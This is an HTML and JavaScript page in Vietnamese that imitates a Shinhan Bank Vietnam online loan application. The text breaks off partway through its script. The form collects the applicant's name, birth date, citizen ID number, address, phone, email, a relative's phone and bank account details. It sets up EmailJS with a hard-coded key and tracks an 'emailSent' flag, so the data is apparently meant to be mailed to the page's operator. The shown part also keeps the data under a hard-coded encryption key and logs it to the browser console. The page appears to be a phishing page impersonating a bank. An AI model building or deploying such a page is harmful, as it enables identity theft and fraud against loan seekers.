<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shinhan Bank - Nhập Thông Tin</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary-color: #003087;
            --secondary-color: #f5f6f5;
            --accent-color: #ff6200;
        }
        body {
            font-family: 'Roboto', sans-serif;
            background-color: var(--secondary-color);
        }
        .navbar {
            background-color: var(--primary-color);
        }
        .navbar-brand img {
            height: 50px;
        }
        .navbar-nav .nav-link {
            color: white !important;
            transition: color 0.3s;
        }
        .navbar-nav .nav-link:hover {
            color: var(--accent-color) !important;
        }
        .step-indicator {
            display: flex;
            justify-content: center;
            margin: 20px 0;
            position: relative;
        }
        .step {
            padding: 10px 20px;
            margin: 0 10px;
            border-radius: 20px;
            background-color: #d3d3d3;
            color: #333;
            font-weight: bold;
            position: relative;
            z-index: 1;
            transition: all 0.3s;
            font-size: 0.9rem;
        }
        .step.active {
            background-color: var(--accent-color);
            color: white;
        }
        .step::before {
            content: '\f058';
            font-family: 'Font Awesome 6 Free';
            font-weight: 900;
            margin-right: 5px;
        }
        .step-indicator::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 10%;
            right: 10%;
            height: 3px;
            background-color: #d3d3d3;
            z-index: 0;
        }
        .progress-percentage {
            text-align: center;
            font-size: 1rem;
            color: var(--primary-color);
            margin-bottom: 10px;
        }
        .form-section {
            background: white;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.1);
            margin-bottom: 15px;
        }
        .form-section h3 {
            color: var(--primary-color);
            border-bottom: 2px solid var(--accent-color);
            padding-bottom: 8px;
            margin-bottom: 15px;
            font-size: 1.2rem;
        }
        .form-control, .form-select {
            font-size: 0.9rem;
            padding: 8px;
        }
        .form-control:focus {
            border-color: var(--accent-color);
            box-shadow: 0 0 5px rgba(255, 98, 0, 0.5);
        }
        .btn-primary {
            background-color: var(--primary-color);
            border-color: var(--primary-color);
            padding: 8px 15px;
            font-size: 0.9rem;
            transition: background-color 0.3s;
        }
        .btn-primary:hover {
            background-color: var(--accent-color);
            border-color: var(--accent-color);
        }
        .error {
            color: #dc3545;
            font-size: 0.8rem;
            margin-top: 3px;
        }
        .success-message {
            color: #28a745;
            font-size: 0.8rem;
            margin-top: 5px;
            display: none;
        }
        .footer-links a {
            margin: 0 8px;
            color: var(--primary-color);
            text-decoration: none;
            font-size: 0.9rem;
        }
        .footer-links a:hover {
            color: var(--accent-color);
        }
        .calculation-table {
            margin-top: 15px;
            font-size: 0.9rem;
        }
        .spinner {
            display: none;
            margin-left: 8px;
        }
        .accordion-button {
            font-size: 0.9rem;
        }
        .tooltip-icon {
            color: var(--primary-color);
            margin-left: 5px;
            cursor: pointer;
        }
        .block-message {
            background: #fff3cd;
            padding: 15px;
            border-radius: 8px;
            text-align: center;
            margin: 20px 0;
            color: #856404;
        }
        @media (max-width: 768px) {
            .navbar-brand img {
                height: 40px;
            }
            .step-indicator {
                display: none;
            }
            .progress-percentage {
                font-size: 0.9rem;
            }
            .form-section {
                padding: 10px;
            }
            .form-section h3 {
                font-size: 1rem;
            }
            .btn-primary {
                width: 100%;
                margin-bottom: 10px;
            }
            .calculation-table {
                font-size: 0.8rem;
            }
            .accordion-button {
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <header>
        <nav class="navbar navbar-expand-lg">
            <div class="container">
                <a class="navbar-brand" href="#"><img src="https://via.placeholder.com/150x50?text=Shinhan+Bank+Logo" alt="Shinhan Bank Logo"></a>
                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                </button>
                <div class="collapse navbar-collapse" id="navbarNav">
                    <ul class="navbar-nav ms-auto">
                        <li class="nav-item"><a class="nav-link" href="#">GIỚI THIỆU</a></li>
                        <li class="nav-item"><a class="nav-link" href="#">LỢI ÍCH</a></li>
                        <li class="nav-item"><a class="nav-link" href="#">GIẤY TỜ CẦN THIẾT</a></li>
                        <li class="nav-item"><a class="nav-link active" href="#">ĐĂNG KÝ TRỰC TUYẾN</a></li>
                        <li class="nav-item"><a class="nav-link" href="#">XEM KẾT QUẢ</a></li>
                        <li class="nav-item"><a class="nav-link" href="#">ĐIỀU KHOẢN SỬ DỤNG</a></li>
                        <li class="nav-item"><a class="nav-link" href="#">LIÊN HỆ</a></li>
                        <li class="nav-item"><a class="nav-link" href="#">MESSENGER</a></li>
                    </ul>
                </div>
            </div>
        </nav>
    </header>

    <main class="container mt-3">
        <div class="progress-percentage">Tiến trình: 12.5% (Bước 1/8)</div>
        <div class="step-indicator">
            <div class="step active">1. Nhập thông tin</div>
            <div class="step">2. Xác thực và xử lý</div>
            <div class="step">3. Hoàn thành</div>
        </div>

        <div id="blockMessage" class="block-message" style="display: none;">
            <p><strong>Thông báo:</strong> Đã có hồ sơ đăng ký tại Ngân hàng Shinhan. Vui lòng liên hệ hỗ trợ để biết thêm chi tiết.</p>
        </div>

        <div id="registrationContent">
            <h2 class="text-center mb-3">THÔNG TIN ĐĂNG KÝ KHOẢN VAY</h2>

            <form id="registrationForm" onsubmit="handleSubmit(event)">
                <input type="hidden" name="_csrf" value="mock-csrf-token">

                <div class="accordion" id="formAccordion">
                    <div class="accordion-item">
                        <h2 class="accordion-header">
                            <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#personalInfo" aria-expanded="true" aria-controls="personalInfo">
                                THÔNG TIN CÁ NHÂN
                            </button>
                        </h2>
                        <div id="personalInfo" class="accordion-collapse collapse show" data-bs-parent="#formAccordion">
                            <div class="accordion-body">
                                <div class="row">
                                    <div class="col-md-6 mb-3">
                                        <label for="fullName" class="form-label">Họ và Tên * <i class="fas fa-info-circle tooltip-icon" data-bs-toggle="tooltip" title="Nhập đầy đủ họ và tên như trên CCCD"></i></label>
                                        <input type="text" class="form-control" id="fullName" name="fullName" required aria-required="true">
                                        <p id="fullNameError" class="error"></p>
                                    </div>
                                    <div class="col-md-6 mb-3">
                                        <label for="dob" class="form-label">Ngày sinh *</label>
                                        <input type="date" class="form-control" id="dob" name="dob" required aria-required="true">
                                        <p id="dobError" class="error"></p>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-md-6 mb-3">
                                        <label for="gender" class="form-label">Giới tính *</label>
                                        <select class="form-select" id="gender" name="gender" required aria-required="true">
                                            <option value="">Chọn giới tính</option>
                                            <option value="Nam">Nam</option>
                                            <option value="Nữ">Nữ</option>
                                            <option value="Khác">Khác</option>
                                        </select>
                                        <p id="genderError" class="error"></p>
                                    </div>
                                    <div class="col-md-6 mb-3">
                                        <label for="address" class="form-label">Địa chỉ thường trú *</label>
                                        <input type="text" class="form-control" id="address" name="address" required aria-required="true">
                                        <p id="addressError" class="error"></p>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-md-6 mb-3">
                                        <label for="cccd" class="form-label">Số định danh cá nhân (CCCD/CMND) *</label>
                                        <input type="text" class="form-control" id="cccd" name="cccd" required aria-required="true">
                                        <p id="cccdError" class="error"></p>
                                    </div>
                                    <div class="col-md-6 mb-3">
                                        <label for="issuePlace" class="form-label">Nơi cấp *</label>
                                        <select class="form-select" id="issuePlace" name="issuePlace" required aria-required="true">
                                            <option value="">Chọn nơi cấp</option>
                                            <option value="CỤC TRƯỜNG CỤC CẢNH SÁT QUẢN LÝ HÀNH CHÍNH VỀ TTXH">CỤC TRƯỜNG CỤC CẢNH SÁT QUẢN LÝ HÀNH CHÍNH VỀ TTXH</option>
                                            <option value="Cục Cảnh sát ĐKQL Cư trú và DLQG về dân cư">Cục Cảnh sát ĐKQL Cư trú và DLQG về dân cư</option>
                                        </select>
                                        <p id="issuePlaceError" class="error"></p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="accordion-item">
                        <h2 class="accordion-header">
                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#registrationInfo" aria-expanded="false" aria-controls="registrationInfo">
                                THÔNG TIN ĐĂNG KÝ
                            </button>
                        </h2>
                        <div id="registrationInfo" class="accordion-collapse collapse" data-bs-parent="#formAccordion">
                            <div class="accordion-body">
                                <div class="row">
                                    <div class="col-md-6 mb-3">
                                        <label for="phone" class="form-label">Số điện thoại *</label>
                                        <input type="tel" class="form-control" id="phone" name="phone" required aria-required="true">
                                        <p id="phoneError" class="error"></p>
                                    </div>
                                    <div class="col-md-6 mb-3">
                                        <label for="email" class="form-label">E-mail *</label>
                                        <input type="email" class="form-control" id="email" name="email" required aria-required="true">
                                        <p id="emailError" class="error"></p>
                                        <small class="form-text text-muted">Bạn sẽ nhận thông tin hướng dẫn qua email này.</small>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-md-6 mb-3">
                                        <label for="loanType" class="form-label">Hình thức vay *</label>
                                        <select class="form-select" id="loanType" name="loanType" required aria-required="true">
                                            <option value="">Chọn Hình thức vay</option>
                                            <option value="Vay tín chấp">Vay tín chấp</option>
                                            <option value="Vay thế chấp">Vay thế chấp</option>
                                            <option value="Vay thấu chi">Vay thấu chi</option>
                                            <option value="Vay trả góp">Vay trả góp</option>
                                        </select>
                                        <p id="loanTypeError" class="error"></p>
                                    </div>
                                    <div class="col-md-6 mb-3">
                                        <label for="loanTerm" class="form-label">Thời hạn vay yêu cầu * <i class="fas fa-info-circle tooltip-icon" data-bs-toggle="tooltip" title="Chọn số tháng vay phù hợp"></i></label>
                                        <select class="form-select" id="loanTerm" name="loanTerm" required aria-required="true">
                                            <option value="">Chọn số tháng</option>
                                            <option value="6">6 tháng</option>
                                            <option value="12">12 tháng</option>
                                            <option value="18">18 tháng</option>
                                            <option value="24">24 tháng</option>
                                            <option value="36">36 tháng</option>
                                            <option value="48">48 tháng</option>
                                            <option value="60">60 tháng</option>
                                        </select>
                                        <p id="loanTermError" class="error"></p>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-md-6 mb-3">
                                        <label for="loanAmount" class="form-label">Số tiền vay yêu cầu (VND) *</label>
                                        <select class="form-select" id="loanAmount" name="loanAmount" required aria-required="true">
                                            <option value="">Chọn số tiền</option>
                                            <option value="10000000">10,000,000</option>
                                            <option value="20000000">20,000,000</option>
                                            <option value="30000000">30,000,000</option>
                                            <option value="40000000">40,000,000</option>
                                            <option value="50000000">50,000,000</option>
                                            <option value="60000000">60,000,000</option>
                                            <option value="70000000">70,000,000</option>
                                            <option value="80000000">80,000,000</option>
                                            <option value="90000000">90,000,000</option>
                                            <option value="100000000">100,000,000</option>
                                            <option value="150000000">150,000,000</option>
                                            <option value="200000000">200,000,000</option>
                                            <option value="300000000">300,000,000</option>
                                            <option value="400000000">400,000,000</option>
                                            <option value="500000000">500,000,000</option>
                                            <option value="other">Khác</option>
                                        </select>
                                        <p id="loanAmountError" class="error"></p>
                                    </div>
                                    <div class="col-md-6 mb-3">
                                        <label for="disbursementDate" class="form-label">Dự kiến giải ngân ngày *</label>
                                        <input type="date" class="form-control" id="disbursementDate" name="disbursementDate" required aria-required="true">
                                        <p id="disbursementDateError" class="error"></p>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-md-6 mb-3">
                                        <label for="interestRate" class="form-label">Lãi suất (%/năm) * <i class="fas fa-info-circle tooltip-icon" data-bs-toggle="tooltip" title="Nhập lãi suất dự kiến, ví dụ: 7.5"></i></label>
                                        <input type="number" class="form-control" id="interestRate" name="interestRate" step="0.01" required aria-required="true">
                                        <p id="interestRateError" class="error"></p>
                                    </div>
                                    <div class="col-md-6 mb-3">
                                        <label for="monthlyIncome" class="form-label">Thu nhập hàng tháng (VND) *</label>
                                        <input type="number" class="form-control" id="monthlyIncome" name="monthlyIncome" required aria-required="true">
                                        <p id="monthlyIncomeError" class="error"></p>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-md-6 mb-3">
                                        <label for="occupation" class="form-label">Nghề nghiệp *</label>
                                        <select class="form-select" id="occupation" name="occupation" required aria-required="true">
                                            <option value="">Chọn nghề nghiệp</option>
                                            <option value="Kỹ sư">Kỹ sư</option>
                                            <option value="Nhân viên văn phòng">Nhân viên văn phòng</option>
                                            <option value="Giáo viên">Giáo viên</option>
                                            <option value="Bác sĩ">Bác sĩ</option>
                                            <option value="Kinh doanh">Kinh doanh</option>
                                            <option value="Nội trợ">Nội trợ</option>
                                            <option value="Hưu trí">Hưu trí</option>
                                            <option value="Khác">Khác</option>
                                        </select>
                                        <p id="occupationError" class="error"></p>
                                    </div>
                                    <div class="col-md-6 mb-3">
                                        <label for="loanPurpose" class="form-label">Mục đích vay *</label>
                                        <select class="form-select" id="loanPurpose" name="loanPurpose" required aria-required="true">
                                            <option value="">Chọn mục đích vay</option>
                                            <option value="Mua nhà">Mua nhà</option>
                                            <option value="Mua xe">Mua xe</option>
                                            <option value="Kinh doanh">Kinh doanh</option>
                                            <option value="Học tập">Học tập</option>
                                            <option value="Du lịch">Du lịch</option>
                                            <option value="Tiêu dùng">Tiêu dùng</option>
                                            <option value="Khác">Khác</option>
                                        </select>
                                        <p id="loanPurposeError" class="error"></p>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-md-6 mb-3">
                                        <label for="relativePhone" class="form-label">Số điện thoại người thân *</label>
                                        <input type="tel" class="form-control" id="relativePhone" name="relativePhone" required aria-required="true">
                                        <p id="relativePhoneError" class="error"></p>
                                    </div>
                                    <div class="col-md-6 mb-3">
                                        <label for="relationship" class="form-label">Quan hệ *</label>
                                        <select class="form-select" id="relationship" name="relationship" required aria-required="true">
                                            <option value="">Chọn quan hệ</option>
                                            <option value="Bạn bè">Bạn bè</option>
                                            <option value="Anh">Anh</option>
                                            <option value="Chị">Chị</option>
                                            <option value="Em">Em</option>
                                            <option value="Đồng nghiệp">Đồng nghiệp</option>
                                            <option value="Vợ/Chồng">Vợ/Chồng</option>
                                            <option value="Bố">Bố</option>
                                            <option value="Mẹ">Mẹ</option>
                                            <option value="Khác">Khác</option>
                                        </select>
                                        <p id="relationshipError" class="error"></p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="accordion-item">
                        <h2 class="accordion-header">
                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#accountInfo" aria-expanded="false" aria-controls="accountInfo">
                                TÀI KHOẢN GIẢI NGÂN
                            </button>
                        </h2>
                        <div id="accountInfo" class="accordion-collapse collapse" data-bs-parent="#formAccordion">
                            <div class="accordion-body">
                                <div class="row">
                                    <div class="col-md-6 mb-3">
                                        <label for="accountName" class="form-label">Tên chủ tài khoản *</label>
                                        <input type="text" class="form-control" id="accountName" name="accountName" required aria-required="true">
                                        <p id="accountNameError" class="error"></p>
                                    </div>
                                    <div class="col-md-6 mb-3">
                                        <label for="accountNumber" class="form-label">Số tài khoản *</label>
                                        <input type="text" class="form-control" id="accountNumber" name="accountNumber" required aria-required="true">
                                        <p id="accountNumberError" class="error"></p>
                                    </div>
                                </div>
                                <div class="mb-3">
                                    <label for="bankName" class="form-label">Tên ngân hàng *</label>
                                    <select class="form-select" id="bankName" name="bankName" required aria-required="true">
                                        <option value="">Chọn ngân hàng</option>
                                        <option value="Shinhan Bank">Shinhan Bank</option>
                                        <option value="Vietcombank">Vietcombank</option>
                                        <option value="Techcombank">Techcombank</option>
                                        <option value="BIDV">BIDV</option>
                                        <option value="Agribank">Agribank</option>
                                        <option value="MB Bank">MB Bank</option>
                                        <option value="VPBank">VPBank</option>
                                        <option value="Sacombank">Sacombank</option>
                                        <option value="ACB">ACB</option>
                                        <option value="VietinBank">VietinBank</option>
                                        <option value="TPBank">TPBank</option>
                                        <option value="HDBank">HDBank</option>
                                        <option value="MSB">MSB</option>
                                        <option value="VIB">VIB</option>
                                        <option value="SeABank">SeABank</option>
                                        <option value="OCB">OCB</option>
                                        <option value="SCB">SCB</option>
                                        <option value="Nam A Bank">Nam A Bank</option>
                                        <option value="SHB">SHB</option>
                                        <option value="PVcomBank">PVcomBank</option>
                                        <option value="BAOVIET Bank">BAOVIET Bank</option>
                                        <option value="LienVietPostBank">LienVietPostBank</option>
                                        <option value="SAIGONBANK">SAIGONBANK</option>
                                    </select>
                                    <p id="bankNameError" class="error"></p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="accordion-item">
                        <h2 class="accordion-header">
                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#calculationResult" aria-expanded="false" aria-controls="calculationResult">
                                KẾT QUẢ TÍNH TOÁN
                            </button>
                        </h2>
                        <div id="calculationResult" class="accordion-collapse collapse" data-bs-parent="#formAccordion">
                            <div class="accordion-body">
                                <div id="calculationSummary" class="mb-3">
                                    <p>Số tiền vay: <span id="calcLoanAmount">0</span> VND</p>
                                    <p>Thanh toán hàng tháng: <span id="calcMonthlyPayment">0</span> VND</p>
                                    <p>Tổng lãi phải trả: <span id="calcTotalInterest">0</span> VND</p>
                                    <p>Tổng gốc + lãi: <span id="calcTotalAmount">0</span> VND</p>
                                </div>
                                <p id="calculationSuccess" class="success-message">Tính toán hoàn tất!</p>
                                <table class="table table-bordered calculation-table">
                                    <thead>
                                        <tr>
                                            <th>Tháng</th>
                                            <th>Gốc (VND)</th>
                                            <th>Lãi (VND)</th>
                                            <th>Tổng (VND)</th>
                                            <th>Dư nợ (VND)</th>
                                        </tr>
                                    </thead>
                                    <tbody id="calculationTable"></tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="form-check mb-3">
                    <input class="form-check-input" type="checkbox" id="privacyConsent" required aria-required="true">
                    <label class="form-check-label" for="privacyConsent">
                        Tôi đồng ý với <a href="#" target="_blank">Chính sách bảo mật</a> và <a href="#" target="_blank">Điều khoản sử dụng</a>.
                    </label>
                    <p id="privacyConsentError" class="error"></p>
                </div>

                <div class="d-flex justify-content-between mt-3 flex-column flex-md-row">
                    <div class="mb-2 mb-md-0">
                        <a href="#" class="btn btn-outline-secondary">TRANG CHỦ</a>
                        <button type="button" class="btn btn-outline-danger ms-2" onclick="resetProgress()">XÓA TIẾN TRÌNH</button>
                    </div>
                    <div>
                        <button type="button" class="btn btn-primary position-relative" onclick="calculateLoan()">
                            TÍNH TOÁN
                            <span class="spinner-border spinner-border-sm spinner" role="status" aria-hidden="true"></span>
                        </button>
                        <button type="submit" class="btn btn-primary ms-2 position-relative">
                            ĐĂNG KÝ
                            <span class="spinner-border spinner-border-sm spinner" role="status" aria-hidden="true"></span>
                        </button>
                    </div>
                </div>
            </form>
        </div>
    </main>

    <footer class="bg-light py-3 mt-4">
        <div class="container text-center">
            <div class="footer-links">
                <a href="#">Chính sách bảo mật</a> |
                <a href="#">Điều khoản sử dụng</a> |
                <a href="#">Chính sách Cookies</a> |
                <a href="#">Miễn khoản từ chối liên kết bên ngoài</a> |
                <a href="#">Hướng dẫn truy cập web</a> |
                <a href="#">Sitemap</a>
            </div>
            <p class="mt-2">
                Trung tâm bảo mật | Demo Ngân hàng trực tuyến | Liên hệ | Trang Global Portal | Giới Thiệu
            </p>
            <p>© 2015 SHINHAN BANK VIETNAM ALL RIGHTS RESERVED.</p>
            <p>Ngân hàng Shinhan được quản lý bởi Ngân hàng Nhà nước Việt Nam.</p>
        </div>
    </footer>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3.11.0/dist/email.min.js"></script>
    <script>
        // Initialize EmailJS
        emailjs.init("OrBsI926QI2_xBh1f");

        let userData = {};
        let registeredUsers = JSON.parse(localStorage.getItem('registeredUsers')) || [];

        // Initialize tooltips and input masks
        $(document).ready(function(){
            $('[data-bs-toggle="tooltip"]').tooltip();
            $('#phone').mask('0000 000 000');
            $('#relativePhone').mask('0000 000 000');
            $('#cccd').mask('000000000000');
            $('#accountNumber').mask('0000000000000000');
        });

        // Check for existing registration
        window.onload = function() {
            loadUserData();
            if (localStorage.getItem('registered')) {
                document.getElementById('blockMessage').style.display = 'block';
                document.getElementById('registrationContent').style.display = 'none';
                return;
            }
        };

        function getCurrentDate() {
            const today = new Date();
            const day = String(today.getDate()).padStart(2, '0');
            const month = String(today.getMonth() + 1).padStart(2, '0');
            const year = today.getFullYear();
            return `${day}/${month}/${year}`;
        }

        function checkLocalStorageQuota() {
            try {
                const testKey = '__test__';
                localStorage.setItem(testKey, 'test');
                localStorage.removeItem(testKey);
                return true;
            } catch (e) {
                console.error('LocalStorage quota exceeded');
                alert('Dung lượng lưu trữ trình duyệt đã đầy. Vui lòng xóa dữ liệu trình duyệt.');
                return false;
            }
        }

        function saveToLocalStorage() {
            if (!checkLocalStorageQuota()) {
                return false;
            }
            try {
                const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(userData), 'shinhan-secret-key').toString();
                localStorage.setItem('userData', encryptedData);
                console.log('Saved userData to localStorage:', userData);
                return true;
            } catch (error) {
                console.error('Error saving userData to localStorage:', error);
                alert('Lỗi lưu dữ liệu. Vui lòng thử lại.');
                return false;
            }
        }

        function loadUserData() {
            try {
                const storedData = localStorage.getItem('userData');
                if (storedData) {
                    userData = JSON.parse(CryptoJS.AES.decrypt(storedData, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8));
                    console.log('Loaded userData from localStorage:', userData);
                    if (userData.isRegistered && userData.cccd && registeredUsers.includes(userData.cccd)) {
                        document.getElementById('blockMessage').style.display = 'block';
                        document.getElementById('registrationContent').style.display = 'none';
                    } else {
                        // Load saved data into form
                        document.getElementById('fullName').value = userData.fullName || '';
                        document.getElementById('dob').value = userData.dob || '';
                        document.getElementById('gender').value = userData.gender || '';
                        document.getElementById('address').value = userData.address || '';
                        document.getElementById('cccd').value = userData.cccd || '';
                        document.getElementById('issuePlace').value = userData.issuePlace || '';
                        document.getElementById('phone').value = userData.phone || '';
                        document.getElementById('email').value = userData.email || '';
                        document.getElementById('loanType').value = userData.loanType || '';
                        document.getElementById('loanTerm').value = userData.loanTerm || '';
                        document.getElementById('loanAmount').value = userData.loanAmount || '';
                        document.getElementById('disbursementDate').value = userData.disbursementDate || getCurrentDate();
                        document.getElementById('interestRate').value = userData.interestRate || '';
                        document.getElementById('monthlyIncome').value = userData.monthlyIncome || '';
                        document.getElementById('occupation').value = userData.occupation || '';
                        document.getElementById('loanPurpose').value = userData.loanPurpose || '';
                        document.getElementById('relativePhone').value = userData.relativePhone || '';
                        document.getElementById('relationship').value = userData.relationship || '';
                        document.getElementById('accountName').value = userData.accountName || '';
                        document.getElementById('accountNumber').value = userData.accountNumber || '';
                        document.getElementById('bankName').value = userData.bankName || '';
                    }
                }
            } catch (error) {
                console.error('Error loading userData from localStorage:', error);
            }
        }

        function validateForm() {
            let isValid = true;
            const fields = [
                { id: 'fullName', errorId: 'fullNameError', validate: value => value.trim().length > 0, message: 'Vui lòng nhập đầy đủ họ và tên.' },
                { id: 'dob', errorId: 'dobError', validate: value => value && new Date(value) <= new Date(), message: 'Ngày sinh phải hợp lệ và không phải tương lai.' },
                { id: 'gender', errorId: 'genderError', validate: value => value !== '', message: 'Vui lòng chọn giới tính.' },
                { id: 'address', errorId: 'addressError', validate: value => value.trim().length > 0, message: 'Vui lòng nhập địa chỉ chi tiết.' },
                { id: 'cccd', errorId: 'cccdError', validate: value => /^\d{12}$/.test(value), message: 'Số CCCD phải có đúng 12 chữ số.' },
                { id: 'issuePlace', errorId: 'issuePlaceError', validate: value => value !== '', message: 'Vui lòng chọn nơi cấp CCCD.' },
                { id: 'phone', errorId: 'phoneError', validate: value => /^\d{10}$/.test(value.replace(/\s/g, '')), message: 'Số điện thoại phải có đúng 10 chữ số.' },
                { id: 'email', errorId: 'emailError', validate: value => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value), message: 'Email không hợp lệ, ví dụ: example@domain.com.' },
                { id: 'loanType', errorId: 'loanTypeError', validate: value => value !== '', message: 'Vui lòng chọn hình thức vay.' },
                { id: 'loanTerm', errorId: 'loanTermError', validate: value => value !== '', message: 'Vui lòng chọn thời hạn vay.' },
                { id: 'loanAmount', errorId: 'loanAmountError', validate: value => value !== '' && value !== 'other', message: 'Vui lòng chọn số tiền vay hợp lệ.' },
                { id: 'disbursementDate', errorId: 'disbursementDateError', validate: value => value && new Date(value) >= new Date(), message: 'Ngày giải ngân phải từ hôm nay trở đi.' },
                { id: 'interestRate', errorId: 'interestRateError', validate: value => value > 0 && value <= 20, message: 'LAMD suất phải từ 0.01 đến 20%.' },
                { id: 'monthlyIncome', errorId: 'monthlyIncomeError', validate: value => value >= 1000000, message: 'Thu nhập phải từ 1,000,000 VND trở lên.' },
                { id: 'occupation', errorId: 'occupationError', validate: value => value !== '', message: 'Vui lòng chọn nghề nghiệp.' },
                { id: 'loanPurpose', errorId: 'loanPurposeError', validate: value => value !== '', message: 'Vui lòng chọn mục đích vay.' },
                { id: 'relativePhone', errorId: 'relativePhoneError', validate: value => /^\d{10}$/.test(value.replace(/\s/g, '')), message: 'Số điện thoại người thân phải có đúng 10 chữ số.' },
                { id: 'relationship', errorId: 'relationshipError', validate: value => value !== '', message: 'Vui lòng chọn quan hệ.' },
                { id: 'accountName', errorId: 'accountNameError', validate: value => value.trim().length > 0, message: 'Vui lòng nhập tên chủ tài khoản.' },
                { id: 'accountNumber', errorId: 'accountNumberError', validate: value => /^\d{10,20}$/.test(value.replace(/\s/g, '')), message: 'Số tài khoản phải từ 10 đến 20 chữ số.' },
                { id: 'bankName', errorId: 'bankNameError', validate: value => value !== '', message: 'Vui lòng chọn ngân hàng.' },
                { id: 'privacyConsent', errorId: 'privacyConsentError', validate: value => value === true, message: 'Vui lòng đồng ý với chính sách bảo mật.' }
            ];

            fields.forEach(field => {
                const element = document.getElementById(field.id);
                const value = element.type === 'checkbox' ? element.checked : element.value;
                const errorElement = document.getElementById(field.errorId);
                if (!field.validate(value)) {
                    errorElement.textContent = field.message;
                    isValid = false;
                } else {
                    errorElement.textContent = '';
                }
            });

            // Check for existing registration
            if (isValid && registeredUsers.includes(document.getElementById('cccd').value)) {
                alert('CCCD này đã được sử dụng để đăng ký hồ sơ. Vui lòng kiểm tra email hoặc liên hệ hỗ trợ.');
                isValid = false;
            }

            return isValid;
        }

        function calculateLoan() {
            if (!validateForm()) return;

            const spinner = document.querySelector('.spinner');
            const successMessage = document.getElementById('calculationSuccess');
            spinner.style.display = 'inline-block';
            successMessage.style.display = 'none';

            setTimeout(() => {
                const loanAmount = parseFloat(document.getElementById('loanAmount').value);
                const loanTerm = parseInt(document.getElementById('loanTerm').value);
                const interestRate = parseFloat(document.getElementById('interestRate').value) / 100 / 12;

                const monthlyPayment = (loanAmount * interestRate * Math.pow(1 + interestRate, loanTerm)) / (Math.pow(1 + interestRate, loanTerm) - 1);
                const totalAmount = monthlyPayment * loanTerm;
                const totalInterest = totalAmount - loanAmount;

                document.getElementById('calcLoanAmount').textContent = loanAmount.toLocaleString();
                document.getElementById('calcMonthlyPayment').textContent = monthlyPayment.toFixed(2).toLocaleString();
                document.getElementById('calcTotalInterest').textContent = totalInterest.toFixed(2).toLocaleString();
                document.getElementById('calcTotalAmount').textContent = totalAmount.toFixed(2).toLocaleString();

                let balance = loanAmount;
                const tableBody = document.getElementById('calculationTable');
                tableBody.innerHTML = '';
                for (let month = 1; month <= loanTerm; month++) {
                    const interest = balance * interestRate;
                    const principal = monthlyPayment - interest;
                    balance -= principal;
                    const row = `
                        <tr>
                            <td>${month}</td>
                            <td>${principal.toFixed(2).toLocaleString()}</td>
                            <td>${interest.toFixed(2).toLocaleString()}</td>
                            <td>${monthlyPayment.toFixed(2).toLocaleString()}</td>
                            <td>${balance.toFixed(2).toLocaleString()}</td>
                        </tr>
                    `;
                    tableBody.innerHTML += row;
                }

                userData.monthlyPayment = monthlyPayment;
                userData.totalInterest = totalInterest;
                userData.totalRepayment = totalAmount;
                saveToLocalStorage();

                spinner.style.display = 'none';
                successMessage.style.display = 'block';
            }, 1000);
        }

        function saveFormDataRealTime() {
            userData = {
                fullName: document.getElementById('fullName').value.trim(),
                dob: document.getElementById('dob').value,
                gender: document.getElementById('gender').value,
                address: document.getElementById('address').value.trim(),
                cccd: document.getElementById('cccd').value.trim(),
                issuePlace: document.getElementById('issuePlace').value,
                phone: document.getElementById('phone').value.trim(),
                email: document.getElementById('email').value.trim(),
                loanType: document.getElementById('loanType').value,
                loanTerm: document.getElementById('loanTerm').value,
                loanAmount: document.getElementById('loanAmount').value,
                disbursementDate: document.getElementById('disbursementDate').value,
                interestRate: parseFloat(document.getElementById('interestRate').value) || 0,
                monthlyIncome: parseFloat(document.getElementById('monthlyIncome').value) || 0,
                occupation: document.getElementById('occupation').value,
                loanPurpose: document.getElementById('loanPurpose').value,
                relativePhone: document.getElementById('relativePhone').value.trim(),
                relationship: document.getElementById('relationship').value,
                accountName: document.getElementById('accountName').value.trim(),
                accountNumber: document.getElementById('accountNumber').value.trim(),
                bankName: document.getElementById('bankName').value,
                monthlyPayment: userData.monthlyPayment || 0,
                totalInterest: userData.totalInterest || 0,
                totalRepayment: userData.totalRepayment || 0,
                currentStep: 1,
                isRegistered: userData.isRegistered || false,
                emailSent: userData.emailSent || false
            };
